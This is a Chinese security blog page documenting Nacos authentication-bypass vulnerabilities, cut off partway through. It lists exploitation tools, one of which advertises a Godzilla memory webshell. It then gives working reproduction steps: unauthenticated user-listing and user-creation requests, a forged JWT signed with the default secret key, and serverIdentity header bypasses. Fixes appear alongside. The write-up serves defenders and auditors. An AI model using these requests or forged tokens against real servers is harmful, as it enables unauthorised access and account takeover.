@@ -1,0 +1,892 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Winter">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="写这篇文章的起源自HW期间遇到很多并且之前并未了解Nacos系列漏洞或者Nacos相关信息，故出生了这篇文章 其实关于Nacos安全问题的根本原因，正如官方的开发文档所说，Nacos提供简单的鉴权实现，即只提供防止业务错用的弱鉴权体系，而不是防止恶意攻击的强鉴权体系，正是导致这些安全问题的根本原因，不知道Nacos是否考虑后续改进一下，因为HW期间因此产生的安全问题已经比较影响正常业务了 事实证明">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Nacos系列安全问题整理">
+<meta property="og:url" content="http://example.com/2025/09/04/Nacos%E7%B3%BB%E5%88%97%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86/index.html">
+<meta property="og:site_name" content="Winter">
+<meta property="og:description" content="写这篇文章的起源自HW期间遇到很多并且之前并未了解Nacos系列漏洞或者Nacos相关信息，故出生了这篇文章 其实关于Nacos安全问题的根本原因，正如官方的开发文档所说，Nacos提供简单的鉴权实现，即只提供防止业务错用的弱鉴权体系，而不是防止恶意攻击的强鉴权体系，正是导致这些安全问题的根本原因，不知道Nacos是否考虑后续改进一下，因为HW期间因此产生的安全问题已经比较影响正常业务了 事实证明">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910145433022.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910153248121.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910153557594.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910155914156.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910160119664.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910161257773.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910162711181.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910163105818.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910164309168.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910195125365.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910195101909.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910195406580.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910195631265.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240910200921178.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911142034731.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911141217760.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911141638210.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911115820037.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911125025223.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911143925510.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911183407539.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911151413140.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911154206474.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911154534373.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911155232187.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911155532930.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911155753457.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911160249166.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911164529873.png">
+<meta property="og:image" content="https://img1.plumstar.cn/upload5image-20240911231405911.png">
+<meta property="article:published_time" content="2025-09-04T07:16:43.000Z">
+<meta property="article:modified_time" content="2025-09-04T15:03:06.093Z">
+<meta property="article:author" content="Winter">
+<meta property="article:tag" content="Nacos">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img1.plumstar.cn/upload5image-20240910145433022.png">
+  
+  
+  
+  <title>Nacos系列安全问题整理 - Winter</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Winter</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/wallhaven-w58q8x_1920x1080.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Nacos系列安全问题整理"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-09-04 15:16" pubdate>
+          2025年9月4日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          39 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Nacos系列安全问题整理</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>写这篇文章的起源自HW期间遇到很多并且之前并未了解Nacos系列漏洞或者Nacos相关信息，故出生了这篇文章</p>
+<p>其实关于Nacos安全问题的根本原因，正如官方的开发文档所说，Nacos提供简单的鉴权实现，即只提供防止业务错用的弱鉴权体系，而不是防止恶意攻击的强鉴权体系，正是导致这些安全问题的根本原因，不知道Nacos是否考虑后续改进一下，因为HW期间因此产生的安全问题已经比较影响正常业务了</p>
+<p>事实证明，不安全的一直是人性，而不是其他东西</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910145433022.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="Nacos快速利用工具"><a href="#Nacos快速利用工具" class="headerlink" title="Nacos快速利用工具"></a>Nacos快速利用工具</h1><p>其实本来想放到最后面的，但是想到工作中检查类似漏洞肯定少不了工具，所以放在最前面比较合适，这里我就写俩，其实还是不少的</p>
+<h2 id="HKEcho-Nacos"><a href="#HKEcho-Nacos" class="headerlink" title="HKEcho_Nacos"></a>HKEcho_Nacos</h2><p>作者：<strong>HKEcho@深蓝实验室天玄攻防战队</strong></p>
+<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/HKEcho5213/HKEcho_Nacos.git">https://github.com/HKEcho5213/HKEcho_Nacos.git</a></p>
+<p>工具支持检测以下漏洞：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">0、未授权查看用户列表<br><br>以下漏洞顺序执行直到获取到一个账号：<br>1、检测nacos默认口令<br>2、任意用户添加<br>3、任意用户添加UA<span class="hljs-emphasis">_Bypass</span><br><span class="hljs-emphasis">4、任意用户添加末尾斜杠绕过</span><br><span class="hljs-emphasis">5、默认JWT任意用户添加</span><br><span class="hljs-emphasis">6、JWT_Secret_</span>Key硬编码绕过<br>7、Identity硬编码绕过<br>8、QVD-2023-6271身份认证绕过<br>一旦某个漏洞获取账号密码后，会调用a1phaboy师傅写的nacosleak读取配置文件<br><br>9、Nacos<span class="hljs-emphasis">_Jraft_Hessian反序列化漏洞</span><br><span class="hljs-emphasis">程序会调用c0olw师傅写的NacosRce打一遍Jraft_</span>Hessian反序列化漏洞（本工具在调用这个NacosRce工具前会判断Java环境，若不存在，则告警不执行<br></code></pre></td></tr></table></figure>
+
+<p><strong>安装</strong></p>
+<figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> -r requirements.txt<br></code></pre></td></tr></table></figure>
+
+<p><strong>使用</strong></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-title class_">HKEcho</span>_Nacos&gt;python <span class="hljs-title class_">HKEcho</span>_Nacos.py -h<br>* * * * * * * * * * * * * * * * * * * * * * * *<br>        ~~|<span class="hljs-params"></span>|<span class="hljs-title class_">HKEcho</span> <span class="hljs-title class_">Nacos</span>快速利用工具|<span class="hljs-params"></span>|~~<br>                【*】<span class="hljs-title class_">Author</span>：<span class="hljs-title class_">HKEcho</span><br><br>&lt;*哥斯拉内存马*&gt;<br>密码<span class="hljs-symbol">:pass/key</span><br>设置请求头<span class="hljs-symbol">:x-client-data</span><span class="hljs-symbol">:godzilla</span>;<br>设置<span class="hljs-title class_">Referer</span><span class="hljs-symbol">:https</span><span class="hljs-symbol">://www</span>.google.com/<br>* * * * * * * * * * * * * * * * * * * * * * * *<br><span class="hljs-symbol">usage:</span> <span class="hljs-title class_">HKEcho</span>_Nacos.py [-h] [-u <span class="hljs-variable constant_">URL</span>] [-f <span class="hljs-variable constant_">FILENAME</span>]<br><br>optional <span class="hljs-symbol">arguments:</span><br>  -h, --help   show this help message <span class="hljs-keyword">and</span> exit<br>  -u <span class="hljs-variable constant_">URL</span>       要检查漏洞的单个<span class="hljs-variable constant_">URL</span><span class="hljs-symbol">:http</span><span class="hljs-symbol">://</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-symbol">:</span><span class="hljs-number">8848</span><br>  -f <span class="hljs-variable constant_">FILENAME</span>  批量检测,包含<span class="hljs-variable constant_">URL</span>的文本文件<br></code></pre></td></tr></table></figure>
+
+<p><strong>1、单个目标检测：</strong></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> HKEcho_Nacos.py -u http://<span class="hljs-number">192</span>.<span class="hljs-number">2</span>xx.<span class="hljs-number">2</span>xx.<span class="hljs-number">1</span>x:<span class="hljs-number">8848</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>2、批量目标检测：</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python HKEcho_Nacos<span class="hljs-selector-class">.py</span> -f target<span class="hljs-selector-class">.txt</span> <span class="hljs-comment">//新建target.txt，一行放一个Nacos的URL</span><br></code></pre></td></tr></table></figure>
+
+<p>其他的我就不做过多讲解了，项目作者在项目的readme已经说的比较详细了，可以直接区GitHub看，文章主要重点放在漏洞上</p>
+<h2 id="NacosExploitGUI"><a href="#NacosExploitGUI" class="headerlink" title="NacosExploitGUI"></a>NacosExploitGUI</h2><p><a target="_blank" rel="noopener" href="https://github.com/charonlight/NacosExploitGUI">https://github.com/charonlight/NacosExploitGUI</a></p>
+<p>对于我这种工作期间需要基线排查的还是很方便快捷的</p>
+<h1 id="权限绕过类"><a href="#权限绕过类" class="headerlink" title="权限绕过类"></a>权限绕过类</h1><p>除CVE-2021-29441，都是研发人员在代码中没有将以下鉴权功能配置正确导致的权限绕过</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># 开启鉴权</span><br>nacos.core.auth.<span class="hljs-attribute">enabled</span>=<span class="hljs-literal">true</span><br>nacos.core.auth.system.<span class="hljs-attribute">type</span>=nacos<br><span class="hljs-comment"># 开启鉴权之后，你可以自定义用于生成JWT令牌的密钥  </span><br><span class="hljs-comment"># The default token(Base64 String)</span><br><span class="hljs-comment"># 自定义密钥时，推荐将配置项设置为Base64编码的字符串，且原始密钥长度不得低于32字符。  </span><br>nacos.core.auth.default.token.secret.key=<br><span class="hljs-comment"># 关闭使用user-agent判断服务端请求并放行鉴权的功能</span><br>nacos.core.auth.enable.<span class="hljs-attribute">userAgentAuthWhite</span>=<span class="hljs-literal">false</span><br><span class="hljs-comment"># 当以上两个属性这样如此设置时，以下两个属性生效</span><br><span class="hljs-comment"># 配置自定义身份识别的key（不可为空）和value（不可为空）</span><br><span class="hljs-comment"># 这两个属性是授权白名单，用于标识来自其他服务器的请求。</span><br>nacos.core.auth.server.identity.<span class="hljs-attribute">key</span>=nacosKey<br>nacos.core.auth.server.identity.<span class="hljs-attribute">value</span>=nacosValue<br></code></pre></td></tr></table></figure>
+
+<h2 id="默认配置未授权访问漏洞"><a href="#默认配置未授权访问漏洞" class="headerlink" title="默认配置未授权访问漏洞"></a>默认配置未授权访问漏洞</h2><blockquote>
+<p>成因：nacos.core.auth.enabled &#x3D; false</p>
+</blockquote>
+<p>此漏洞不需要添加任何身份标识来绕过校验，仅仅是因为默认配置未开启鉴权导致漏洞出现</p>
+<p><em><strong>1.1 环境搭建</strong></em></p>
+<p>Nacos gtihub下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br>win10环境搭建</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#进入nacos/bin下执行</span><br>startup.cmd -m standalone<br><span class="hljs-comment">#搭建成功后访问可看到nacos登陆界面</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8848</span><span class="hljs-regexp">/nacos/i</span>ndex.html<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.plumstar.cn/upload5image-20240910153248121.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>1.2 漏洞验证</strong></em></p>
+<p>查看用户信息，两个url</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8848</span>/nacos/v1/auth/users?pageNo=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">1</span><br><span class="hljs-attribute">http</span>://localhost:<span class="hljs-number">8848</span>/nacos/v1/auth/users?pageNo=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">1</span>&amp;search=accurate&amp;accessToken<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.plumstar.cn/upload5image-20240910153557594.png" srcset="/img/loading.gif" lazyload></p>
+<p>新建用户</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/nacos/v1/auth/users?username=test1&amp;password=test</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img1.plumstar.cn/upload5image-20240910155914156.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功登陆</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910160119664.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>1.3 漏洞原理</strong></em></p>
+<p>默认未开启配置 nacos.core.auth.enabled</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910161257773.png" srcset="/img/loading.gif" lazyload></p>
+<p>在auth&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;auth&#x2F;common&#x2F;AuthConfigs.java类中，isAuthEnabled方法的返回值取决于nacos.core.auth.enabled （默认False）</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910162711181.png" srcset="/img/loading.gif" lazyload></p>
+<p>在core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;core&#x2F;auth&#x2F;AuthFilter.java类中，根据authConifgs.isAuthEnabled()的返回值默认为flase，所以这里默认跳过检查认证filter，直接进入filterchain的下一个filter</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910163105818.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>1.4 修复方案</strong></em></p>
+<p>配置文件修改为：nacos.core.auth.enabled&#x3D;True</p>
+<p>修改之后，再次尝试访问<a target="_blank" rel="noopener" href="http://localhost:8848/nacos/v1/auth/users?pageNo=1&pageSize=1%EF%BC%8C%E5%9B%9E%E6%98%BEWhitelabelErrorPage">http://localhost:8848/nacos/v1/auth/users?pageNo=1&amp;pageSize=1，回显WhitelabelErrorPage</a></p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910164309168.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="默认jwt密钥未授权访问"><a href="#默认jwt密钥未授权访问" class="headerlink" title="默认jwt密钥未授权访问"></a>默认jwt密钥未授权访问</h2><p><em><strong>2.1 漏洞简介</strong></em></p>
+<p>开启了nacos.core.auth.enabled 的情况下，如果未修改默认nacos.core.auth.default.token.secret.key，则可以生产accessToken值来绕过权限。</p>
+<p>该key值固定，在nacos使用jwt构造认证token，使用HS256算法，把配置文件中nacos.core.auth.plugin.nacos.token.secret.key的默认值当作私钥生成Signature，将用户名和时间戳写到jwt token里，所以可以在登录时对accessToken进行伪造，从而实现访问认证绕过</p>
+<p>影响版本：<strong>0.1.0 &lt;&#x3D; Nacos &lt;&#x3D; 2.2.0</strong></p>
+<p>配置文件</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">### If turn on auth system:</span><br><span class="hljs-attr">nacos.core.auth.enabled</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### The default token:</span><br><span class="hljs-attr">nacos.core.auth.default.token.secret.key</span>=SecretKey012345678901234567890123456789012345678901234567890123456789<br></code></pre></td></tr></table></figure>
+
+<p><em><strong>2.2 环境搭建</strong></em></p>
+<p>Nacos gtihub下载地址</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1">https://github.com/alibaba/nacos/releases/tag/2.0.0-ALPHA.1</a><br>win10环境搭建</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#进入nacos/bin下执行</span><br>startup.cmd -m standalone<br><br><span class="hljs-comment">#搭建成功后访问可看到nacos登陆界面</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8848</span><span class="hljs-regexp">/nacos/i</span>ndex.html<span class="hljs-comment">#/login</span><br></code></pre></td></tr></table></figure>
+
+<p><em><strong>2.3 漏洞验证</strong></em></p>
+<p>将默认key拿到在线的jwt生成网站：<a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a></p>
+<p>以及生成一个比当前系统时间晚的unix时间戳，填到payload中，如图</p>
+<p>例如我现在系统时间为2024-09-10，所以我填2024-09-11，比系统时间晚就可以</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910195125365.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910195101909.png" srcset="/img/loading.gif" lazyload></p>
+<p>拿到我们构造的accessToken</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">eyJhbGciOiJIUzI<span class="hljs-number">1</span>NiJ<span class="hljs-number">9</span>.eyJzdWIiOiJuYWNvcyIsImV<span class="hljs-number">4</span>cCI<span class="hljs-number">6</span>IjE<span class="hljs-number">3</span>MjYwNTUzMDAifQ.<span class="hljs-number">6</span>eDNR<span class="hljs-number">9</span>V<span class="hljs-number">3</span><span class="hljs-keyword">x</span><span class="hljs-number">7</span>_H<span class="hljs-number">4</span>bGIsGejg<span class="hljs-number">7</span>TGc-K<span class="hljs-number">8</span>pWaHLE<span class="hljs-number">8</span>GIHqi<span class="hljs-number">5</span><span class="hljs-keyword">gc</span><br></code></pre></td></tr></table></figure>
+
+<p>然后带上我们构造的token即可访问，因为将nacos.core.auth.enabled&#x3D;true打开后，默认只有token验证通过的用户才能访问该页面和添加新用户，甚至可以不需要添加用户直接登陆进去</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910195406580.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以看到返回200，证明登陆成功了，添加用户也是跟上面一样的操作，只不过加个我们伪造的acessToken就好。</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910195631265.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>2.4 漏洞原理</strong></em></p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240910200921178.png" srcset="/img/loading.gif" lazyload></p>
+<p><em><strong>2.5 修复方案</strong></em></p>
+<p>修改默认的nacos.core.auth.default.token.secret.key</p>
+<h2 id="身份认证serverIdentity绕过"><a href="#身份认证serverIdentity绕过" class="headerlink" title="身份认证serverIdentity绕过"></a>身份认证serverIdentity绕过</h2><p><em><strong>3.1 漏洞简介</strong></em></p>
+<p>更合适的说法是危险配置造成的鉴权不严，其实也算是弱口令，因为</p>
+<p><em><strong>3.2 环境搭建</strong></em></p>
+<p>配置如下的时候就会造成这个绕过可用，1.4.1版本复现成功，2.0.0版本复现失败，因为有几个配置并未存在</p>
+<p><img src="https://img1.plumstar.cn/upload5image-20240911142034731.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-comment">### 版本为1.4.1</span><br><span class="hljs-comment">### If turn on auth system:</span><br><span class="hljs-attr">nacos.core.auth.enabled</span>=<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Since 1.4.1, Turn on/off white auth for user-agent: nacos-server, only for upgrade from old version.</span><br><span class="hljs-attr">nacos.core.auth.enable.userAgentAuthWhite</span>=<span class="hljs-literal">false</span> //原配置默认为<span class="hljs-literal">true</span><br><br><span class="hljs-comment">### Since 1.4.1, worked when nacos.core.auth.enabled=true and nacos.core.auth.enable.userAgentAuthWhite=false.</span><br><span class="hljs-comment">### The two properties is the white list for auth and used by identity the request from other server.</span><br><span class="hljs-attr">nacos.core.auth.server.identity.key</span>=serverIdentity //原配置这里默认为空<br><span class="hljs-attr">nacos.core.auth.server.identity.value</span>=security //原配置默认为空<br><br><span class="hljs-comment">### The default token (Base64 String) and len(key)&gt;32:关于这一段，我看好多师傅都写上了，但是我实际测试的时候发现1.4.1版本并未有这个默认配置而且我并没有加只是修改了上方四个配置就可以复现成功</span><br><span class="hljs-attr">nacos.core.auth.plugin.nacos.token.secret.key</span>=MTIzNDU2Nzg5MTIzMTI0MzIxNDM2NTRmYmRmMzI0c2R2c2Rh<br></code></pre></td></tr></table></figure>
+
